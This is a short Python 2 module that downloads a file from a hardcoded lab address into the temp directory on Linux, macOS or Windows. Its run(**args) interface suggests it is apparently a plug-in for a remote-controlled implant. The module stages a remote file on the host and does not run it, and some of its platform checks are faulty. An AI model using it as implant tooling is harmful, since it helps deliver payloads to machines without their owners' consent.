import urllib
import tempfile
import os
import platform

#download to temp for osx

def run(**args):
    try:
        url = "http://172.16.153.1:8000/meh.txt"
        print "[*] In downoadfromurl module."
    
        if platform.system() == "linux" or platform.system() == "linux2":
            print ("it's Linux") #LINUX #untested
            urllib.urlretrieve(url, os.path.join(tempfile.gettempdir() + '/'  + url.split('/')[-1]))
            info = os.path.getsize(os.path.join(tempfile.gettempdir() + '/'  + url.split('/')[-1]))
            file = os.path.join(tempfile.gettempdir() + '/'  + url.split('/')[-1])
        elif platform.system() == "darwin" or platform.system() == "Darwin":
            print ("it's OSX") #OSX
            urllib.urlretrieve(url, os.path.join(tempfile.gettempdir() + '/'  + url.split('/')[-1]))
            info = os.path.getsize(os.path.join(tempfile.gettempdir() + '/'  + url.split('/')[-1]))
            file = os.path.join(tempfile.gettempdir() + '/'  + url.split('/')[-1])
        elif platform.system() == "win32" or platform.system() == "Windows":
            print ("it's Windows") # Windows
            urllib.urlretrieve(url, os.path.join(os.getenv('TEMP') + '\\'  + url.split('/')[-1]))
            info = os.path.getsize(os.path.join(os.getenv('TEMP') + '\\'  + url.split('/')[-1]))
            file = os.path.join(os.getenv('TEMP') + '\\'  + url.split('/')[-1])
    except IOError:
        print ("cannot open %s" %url)
        return str("could not hit url")

    return str("downloaded file of %s bytes to %s" % (info,file))


